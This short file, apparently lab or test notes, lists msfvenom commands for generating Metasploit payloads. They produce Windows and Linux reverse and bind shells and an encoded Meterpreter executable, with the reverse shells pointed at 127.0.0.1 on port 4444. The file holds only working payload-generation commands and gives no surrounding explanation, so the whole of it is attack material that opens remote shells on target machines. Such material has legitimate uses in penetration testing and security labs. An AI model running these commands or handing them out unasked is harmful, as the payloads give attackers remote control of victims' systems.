windows_reverse_shell
 > msfvenom --arch x86 --platform windows -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f hex -o windows_reverse_shell

windows_bind_shell
 > msfvenom --arch x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -f hex -o windows_bind_shell

meterpreter.exe 
 > msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

linux_reverse_shell
 > msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f hex -o linux_reverse_shell

linux_bind_shell
 > msfvenom --arch x86 --platform linux -p linux/x86/shell_bind_tcp LPORT=4444 -f hex -o linux_bind_shell
